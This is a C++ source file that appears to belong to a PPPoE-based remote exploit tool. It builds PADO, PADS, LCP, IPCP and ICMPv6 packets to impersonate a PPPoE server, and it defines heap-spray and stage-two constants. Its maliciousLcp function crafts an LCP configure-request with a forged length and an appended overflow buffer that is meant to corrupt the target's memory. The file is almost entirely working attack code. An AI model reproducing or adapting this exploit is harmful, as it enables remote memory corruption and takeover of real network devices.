#include <iostream>
#include <sstream>

#include <IPv6Layer.h>
#include <Packet.h>
#include <SystemUtils.h>
#include <PPPoELayer.h>
#include <EthLayer.h>
#include <PayloadLayer.h>
#include <EndianPortable.h>
#include <IcmpV6Layer.h>
#include <NdpLayer.h>
#include <Logger.h>

#include "exploit.h"

#define SPRAY_NUM 0x1000
#define PIN_NUM 0x1000
#define CORRUPT_NUM 0x1

#define HOLE_START 0x400
#define HOLE_SPACE 0x10

#define LCP_ID 0x41
#define IPCP_ID 0x41

#define SESSION_ID 0xffff

#define STAGE2_PORT 9020

#define PPP_IPCP_Option_IP 0x03

const static std::string SOURCE_MAC = "41:41:41:41:41:41";
const static std::string SOURCE_IPV4 = "41.41.41.41";
const static std::string SOURCE_IPV6 = "fe80::4141:4141:4141:4141";

const static std::string TARGET_IPV4 = "42.42.42.42";

const static std::string BPF_FILTER = "(ip6) || (pppoed) || (pppoes && !ip)";

class MyPPPoETagBuilder : public pcpp::PPPoEDiscoveryLayer::PPPoETagBuilder {
public:
    explicit MyPPPoETagBuilder(pcpp::PPPoEDiscoveryLayer::PPPoETagTypes tagType, const uint8_t *recValue,
                               size_t recValueLen) :
            pcpp::PPPoEDiscoveryLayer::PPPoETagBuilder(tagType) {
        this->init(static_cast<uint16_t>(tagType), recValue, recValueLen);
    }
};

uint16_t p16be(uint64_t val) {
    return htobe16(static_cast<uint16_t>(val & 0xffff));
}

static pcpp::PayloadLayer *buildPPPLayer(pcpp::PPPoELayer *last, uint8_t code, uint8_t id,
                                         const uint8_t *data, size_t data_len) {
    uint8_t ppp_data[4 + data_len];
    ppp_data[0] = code;
    ppp_data[1] = id;
    (*(uint16_t * ) & ppp_data[2]) = p16be(4 + data_len);
    if (data_len > 0) memcpy(&ppp_data[4], data, data_len);
    auto *pppLayer = new pcpp::PayloadLayer(ppp_data, sizeof(ppp_data), false);
    last->getPPPoEHeader()->payloadLength = p16be(p16be(last->getPPPoEHeader()->payloadLength) +
                                                  sizeof(ppp_data) + sizeof(uint16_t));
    return pppLayer;
}

// Fake PPP layer, with custom payload len in header filed
static pcpp::PayloadLayer *buildPPPLayer(pcpp::PPPoELayer *last, uint8_t code, uint8_t id, size_t data_len) {
    uint8_t ppp_data[4];
    ppp_data[0] = code;
    ppp_data[1] = id;
    (*(uint16_t * ) & ppp_data[2]) = p16be(4 + data_len);
    auto *pppLayer = new pcpp::PayloadLayer(ppp_data, sizeof(ppp_data), false);
    last->getPPPoEHeader()->payloadLength = p16be(p16be(last->getPPPoEHeader()->payloadLength) +
                                                  sizeof(ppp_data) + sizeof(uint16_t));
    return pppLayer;
}

static pcpp::PayloadLayer *buildPPPLCPOptionLayer(pcpp::PPPoELayer *last, const uint8_t *data, size_t data_len) {
    uint8_t option_data[2 + data_len];
    option_data[0] = 0; // type
    option_data[1] = data_len + 2; // len
    if (data_len > 0) memcpy(&option_data[2], data, data_len);
    auto *pppLayer = new pcpp::PayloadLayer(option_data, sizeof(option_data), false);
    last->getPPPoEHeader()->payloadLength = p16be(p16be(last->getPPPoEHeader()->payloadLength) +
                                                  sizeof(option_data));
    return pppLayer;
}

void PacketBuilder::hexPrint(const uint8_t* data, size_t len) {
    std::stringstream ss;
    ss << std::hex;
    for (int i = 0; i < len; ++i) {
        if (i % 16 == 0) {
            if (i != 0) ss << "\n";
            ss << std::setw(4) << std::setfill('0') << i << " ";
        }
        ss << std::setw(2) << std::setfill('0') << (int) data[i] << " ";
    }
    std::cout << ss.str() << std::endl;
}

void PacketBuilder::hexPrint(const pcpp::Packet &packet) {
    PacketBuilder::hexPrint(packet.getRawPacket()->getRawData(), packet.getRawPacket()->getRawDataLen());
}

pcpp::Packet PacketBuilder::lcpEchoReply(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac,
                                         uint16_t session, uint8_t id, uint32_t magic_number) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, session, PCPP_PPP_LCP);

    magic_number = htole32(magic_number);
    auto *lcpEchoReply = buildPPPLayer(pppoeLayer, ECHO_REPLY, id, (uint8_t * ) & magic_number, sizeof(uint32_t));

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(lcpEchoReply, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::pado(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac,
                                 const uint8_t *ac_cookie, size_t ac_cookie_len,
                                 const uint8_t *host_uniq, size_t host_uniq_len) {
    pcpp::Packet packet;
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOED);
    auto *pppoeLayer = new pcpp::PPPoEDiscoveryLayer(1, 1, pcpp::PPPoELayer::PPPOE_CODE_PADO, 0);
    pppoeLayer->addTag(MyPPPoETagBuilder{pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_AC_COOKIE, ac_cookie, ac_cookie_len});
    pppoeLayer->addTag(MyPPPoETagBuilder{pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_HOST_UNIQ, host_uniq, host_uniq_len});
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::pads(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac,
                                 const uint8_t *host_uniq, size_t host_uniq_len) {
    pcpp::Packet packet;
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOED);
    auto *pppoeLayer = new pcpp::PPPoEDiscoveryLayer(1, 1, pcpp::PPPoELayer::PPPOE_CODE_PADS, SESSION_ID);
    pppoeLayer->addTag(MyPPPoETagBuilder{pcpp::PPPoEDiscoveryLayer::PPPOE_TAG_HOST_UNIQ, host_uniq, host_uniq_len});

    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::padt(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac) {
    pcpp::Packet packet;
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOED);
    auto *pppoeLayer = new pcpp::PPPoEDiscoveryLayer(1, 1, pcpp::PPPoELayer::PPPOE_CODE_PADT, SESSION_ID);

    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::lcpRequest(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac) {
    pcpp::Packet packet;
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
    auto *pppLayer = buildPPPLayer(pppoeLayer, CONF_REQ, LCP_ID, nullptr, 0);
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::lcpAck(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac, uint8_t id) {
    pcpp::Packet packet;
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
    auto *pppLayer = buildPPPLayer(pppoeLayer, CONF_ACK, id, nullptr, 0);

    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::ipcpRequest(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_IPCP);

    std::vector<uint8_t> data(6);
    data[0] = PPP_IPCP_Option_IP;
    data[1] = data.size();
    uint32_t ip = pcpp::IPv4Address(SOURCE_IPV4).toInt();
    for (int i = 0; i < 4; ++i) {
        data[i + 2] = (ip >> (i * 8)) & 0xFF;
    }
    pcpp::PayloadLayer *pppLayer = buildPPPLayer(pppoeLayer, CONF_REQ, IPCP_ID, data.data(), data.size());

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet
PacketBuilder::ipcpNak(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac, uint8_t id) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_IPCP);

    std::vector<uint8_t> data(6);
    data[0] = PPP_IPCP_Option_IP;
    data[1] = data.size();
    uint32_t ip = pcpp::IPv4Address(TARGET_IPV4).toInt();
    for (int i = 0; i < 4; ++i) {
        data[i + 2] = (ip >> (i * 8)) & 0xFF;
    }
    pcpp::PayloadLayer *pppLayer = buildPPPLayer(pppoeLayer, CONF_NAK, id, data.data(), data.size());

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::ipcpAck(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac, uint8_t id,
                                    const uint8_t *option, size_t option_len) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_IPCP);
    pcpp::PayloadLayer *pppLayer = buildPPPLayer(pppoeLayer, CONF_ACK, id, option, option_len);

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::icmpv6Echo(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac,
                                       const pcpp::IPv6Address &source_ipv6, const pcpp::IPv6Address &target_ipv6) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *ipv6Layer = new pcpp::IPv6Layer(source_ipv6, target_ipv6);
    ipv6Layer->getIPv6Header()->hopLimit = 0x40;
    auto *echoRequestLayer = new pcpp::ICMPv6EchoLayer(pcpp::ICMPv6EchoLayer::REQUEST, 0, 0, nullptr, 0);

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(ipv6Layer, true);
    packet.addLayer(echoRequestLayer, true);
    packet.computeCalculateFields();
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::icmpv6Na(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac,
                                     const pcpp::IPv6Address &source_ipv6, const pcpp::IPv6Address &target_ipv6) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, PCPP_ETHERTYPE_PPPOES);
    auto *ipv6Layer = new pcpp::IPv6Layer(source_ipv6, target_ipv6);
    ipv6Layer->getIPv6Header()->hopLimit = 0xFF;
    auto *ndpLayer = new pcpp::NDPNeighborAdvertisementLayer(0, source_ipv6, source_mac, true, true, true);
    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(ipv6Layer, true);
    packet.addLayer(ndpLayer, true);
    packet.computeCalculateFields();
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::pinCpu0(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, ETHERTYPE_PPPOE);
    pcpp::Packet packet;
    packet.addLayer(ether, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::maliciousLcp(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac,
                                         const uint8_t *overflow, size_t overflow_len) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, ETHERTYPE_PPPOE);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
    auto *pppLayer = buildPPPLayer(pppoeLayer, CONF_REQ, LCP_ID, TARGET_SIZE);
    std::vector<uint8_t> ppp_data(TARGET_SIZE - 4, 'A');
    auto *pppDataLayer = buildPPPLCPOptionLayer(pppoeLayer, ppp_data.data(), ppp_data.size());
    auto *overflowLayer = buildPPPLCPOptionLayer(pppoeLayer, overflow, overflow_len);

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    packet.addLayer(pppDataLayer, true);
    packet.addLayer(overflowLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::Packet PacketBuilder::lcpTerminate(const pcpp::MacAddress &source_mac, const pcpp::MacAddress &target_mac) {
    auto *ether = new pcpp::EthLayer(source_mac, target_mac, ETHERTYPE_PPPOE);
    auto *pppoeLayer = new pcpp::PPPoESessionLayer(1, 1, SESSION_ID, PCPP_PPP_LCP);
    auto *pppLayer = buildPPPLayer(pppoeLayer, CONF_TEM, 0, nullptr, 0);

    pcpp::Packet packet;
    packet.addLayer(ether, true);
    packet.addLayer(pppoeLayer, true);
    packet.addLayer(pppLayer, true);
    hexdump(packet);
    return packet;
}

pcpp::PPPoESessionLayer *PacketBuilder::getPPPoESessionLayer(const pcpp::Packet &packet, uint16_t pppType) {
    if (!packet.isPacketOfType(pcpp::PPPoESession)) return nullptr;
    auto *pppLayer = packet.getLayerOfType<pcpp::PPPoESessionLayer>();
    if (pppLayer && pppLayer->getPPPNextProtocol() == pppType) return pppLayer;
    return nullptr;
}

pcpp::PPPoEDiscoveryLayer *PacketBuilder::getPPPoEDiscoveryLayer(const pcpp::Packet &packet, uint8_t type) {
    if (!packet.isPacketOfType(pcpp::PPPoEDiscovery)) return nullptr;
    auto *layer = packet.getLayerOfType<pcpp::PPPoEDiscoveryLayer>();
    if (layer && layer->getPPPoEHeader()->code == type) return layer;
    return nullptr;
}